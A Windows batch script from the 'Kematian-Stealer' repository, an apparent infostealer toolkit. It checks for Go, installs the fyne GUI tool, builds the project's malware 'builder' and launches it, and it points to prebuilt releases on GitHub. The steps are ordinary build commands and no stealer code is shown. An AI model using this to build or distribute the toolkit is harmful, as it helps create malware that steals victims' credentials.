@echo off

cd /d %~dp0

echo THIS IS IF YOU WANT TO BUILD THE BUILDER YOURSELF.
echo THE BUILDER IS ALREADY BUILT BY GITHUB AND IS 100% OPEN SOURCE.
echo THE BUILT BUILDER IS IN THE RELEASES ON THE GITHUB.
echo https://github.com/itzGlitxh/Kematian-Stealer/releases/tag/Builder
echo.
echo.
echo Press any key to continue building the builder yourself.

pause

go version
if %errorlevel% neq 0 (
    echo "Go is not installed or not in PATH. Either install it or use the prebuilt builder image."
    start "https://golang.org/dl/"
    pause
    exit /b 1
)

cd builder-src
go mod tidy
go install fyne.io/fyne/v2/cmd/fyne@latest
call build.bat
cd ..

timeout /t 3 /nobreak >nul

move /y builder-src\dist\builder.exe builder.exe

start builder.exe

pause
exit /b %errorlevel%
